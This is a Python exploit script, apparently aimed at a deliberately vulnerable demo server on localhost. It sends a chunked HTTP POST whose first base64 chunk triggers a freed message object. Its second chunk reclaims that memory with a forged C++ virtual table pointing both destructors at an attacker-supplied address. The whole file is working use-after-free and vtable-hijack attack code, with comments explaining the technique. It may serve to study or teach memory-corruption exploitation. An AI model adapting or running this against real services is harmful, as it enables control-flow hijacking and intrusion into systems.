#!/usr/bin/env python3


import math
import struct
from argparse import ArgumentParser
from base64 import b64encode
from functools import partial
from http.client import HTTPConnection


def main():
    parser = ArgumentParser()
    parser.add_argument("--target-host", "-H", default="localhost")
    parser.add_argument("--target-port", "-P", type=int, default=9999)
    parser.add_argument("--pwned-dtor-address", type=partial(int, base=16), required=True)
    parser.add_argument("--buffer-address", type=partial(int, base=16), required=True)
    parser.add_argument("--chunk-obj-size", type=int, required=True)
    args = parser.parse_args()

    input("Press any key to send request... ")
    conn = HTTPConnection(args.target_host, args.target_port)
    conn.request(
        "POST",
        "/",
        headers={
            "Content-Type": "application/octet-stream",
            "Transfer-Encoding": "chunked"
        },
        encode_chunked=True,
        body=[
            # 1st chunk with just some random data which must result in an error when the target tries to decode it.
            # The corresponding message object will be overwritten by the 2nd chunk.
            b64encode(b"x" * 90),

            # 2nd chunk
            # We construct a virtual table with pwned_destructor() as a replacement for the real destructor(s) and replace
            # the original table. See https://shaharmike.com/cpp/vtable-part1/ and
            # https://www.martinkysel.com/demystifying-virtual-tables-in-c-part-3-virtual-tables/ for details.
            # The size of the base64-decoded chunk has to be less than or equal the size of the chunk objects but also not
            # to small so the buffer for the decoded data will re-use the memory of the freed object.
            b64encode(
                struct.pack("<Q", args.buffer_address + 8) +                # pointer to virtual table
                struct.pack("<Q", args.pwned_dtor_address) +                      # pointer to the complete object destructor
                struct.pack("<Q", args.pwned_dtor_address) +                      # pointer to the deleting destructor
                b"x" * (math.ceil(args.chunk_obj_size * 3 / 4) - 24)        # to fill the buffer
            )
        ]
    )
    resp = conn.getresponse()
    print(f"Target replied with status {resp.status} {resp.reason}")

    input("Press any key to close connection...")
    conn.close()


if __name__ == '__main__':
    main()
